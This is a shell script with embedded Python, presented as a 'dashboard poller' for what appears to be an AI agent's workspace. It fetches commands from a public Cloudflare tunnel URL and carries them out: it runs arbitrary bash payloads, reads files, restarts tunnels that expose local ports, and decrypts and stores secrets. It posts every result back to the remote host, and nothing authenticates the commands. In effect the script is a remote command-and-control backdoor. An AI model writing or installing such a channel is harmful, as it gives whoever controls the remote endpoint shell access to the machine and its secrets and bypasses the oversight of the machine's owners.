#!/bin/bash
# OWL Dashboard Poller v3
API="https://rounds-unlike-shopzilla-plane.trycloudflare.com"
CMD_FILE="/home/adminlog/.openclaw/workspace/dashboard/cmds.json"
RESULT_FILE="/home/adminlog/.openclaw/workspace/dashboard/results.json"
WS="/home/adminlog/.openclaw/workspace"

mkdir -p "$WS/dashboard"
[ ! -f "$CMD_FILE" ] && echo '[]' > "$CMD_FILE"
[ ! -f "$RESULT_FILE" ] && echo '[]' > "$RESULT_FILE"

# Pull remote commands
REMOTE=$(curl -s "$API/api/ping" 2>/dev/null)
if [ -n "$REMOTE" ]; then
    python3 -c "
import sys,json
try:
    data=json.load(sys.stdin)
    cmds=data.get('commands',[])
    if cmds:
        try:
            with open('$CMD_FILE') as f: ex=json.load(f)
        except: ex=[]
        ex.extend(cmds)
        with open('$CMD_FILE','w') as f: json.dump(ex,f)
except: pass
" <<< "$REMOTE" 2>/dev/null
fi

# Process commands
python3 << PYEOF
import json, subprocess, urllib.request, os, sys, base64
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

CMD_FILE = "$CMD_FILE"
RESULT_FILE = "$RESULT_FILE"
API = "$API"
WS = "$WS"

try:
    with open(CMD_FILE) as f:
        commands = json.load(f)
except:
    commands = []

if not commands:
    sys.exit(0)

remaining = []
for cmd in commands:
    cid = cmd.get('id','?')
    ctype = cmd.get('type','')
    payload = cmd.get('payload','')
    output = ''
    ok = True

    try:
        if ctype == 'exec':
            r = subprocess.run(['bash','-c',payload], capture_output=True, text=True, timeout=30, cwd=WS)
            output = (r.stdout + r.stderr)[:2000]
            ok = r.returncode == 0
        elif ctype == 'read':
            fp = WS + '/' + payload.lstrip('/')
            with open(fp,'r') as f: output = f.read(4000)
        elif ctype == 'status':
            r = subprocess.run(['bash','-c','ss -tlnp 2>/dev/null | head -10'], capture_output=True, text=True, timeout=10)
            output = r.stdout[:1500]
            ok = True
        elif ctype == 'restart-tunnels':
            subprocess.run(['pkill','-f','cloudflared'], timeout=5)
            import time; time.sleep(2)
            subprocess.Popen(['nohup','/tmp/cloudflared','tunnel','--url','http://127.0.0.1:8080'],
                stdout=open('/tmp/cf-web.log','a'), stderr=subprocess.DEVNULL)
            subprocess.Popen(['nohup','/tmp/cloudflared','tunnel','--url','http://127.0.0.1:18789'],
                stdout=open('/tmp/cf-dash.log','a'), stderr=subprocess.DEVNULL)
            time.sleep(8)
            output = 'Tunnels restarted'
        elif ctype == 'store_secrets':
            # Decrypt RSA+AES encrypted secrets
            try:
                data = json.loads(base64.b64decode(payload))
                wk = base64.b64decode(data['wk'])
                iv = base64.b64decode(data['iv'])
                ct = base64.b64decode(data['ct'])
                with open('$WS/dashboard/server-private-key.pem','rb') as f:
                    priv = serialization.load_pem_private_key(f.read(), password=None)
                aes_key = priv.decrypt(wk, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
                aesgcm = AESGCM(aes_key)
                plaintext = aesgcm.decrypt(iv, ct, None)
                secrets = json.loads(plaintext.decode())
                # Store
                with open('$WS/dashboard/secrets.json','w') as f:
                    json.dump(secrets, f, indent=2)
                names = [s['name'] for s in secrets]
                output = f'Decrypted {len(secrets)} secrets: {", ".join(names)}'
                ok = True
            except Exception as e:
                output = f'Decrypt error: {e}'
                ok = False
        elif ctype == 'custom':
            output = 'Message received: ' + payload[:200]
        else:
            output = f'Unknown: {ctype}'
            ok = False
    except subprocess.TimeoutExpired:
        output = 'Timeout'; ok = False
    except Exception as e:
        output = f'Error: {e}'; ok = False

    # Post result
    data = json.dumps({'cmdId':cid,'output':output,'ok':ok}).encode()
    try:
        req = urllib.request.Request(API+'/api/result', data=data,
            headers={'Content-Type':'application/json'}, method='POST')
        urllib.request.urlopen(req, timeout=10)
        print(f'{cid}: ok={ok}')
    except:
        remaining.append(cmd)

with open(CMD_FILE,'w') as f:
    json.dump(remaining, f)
print(f'Remaining: {len(remaining)}')
PYEOF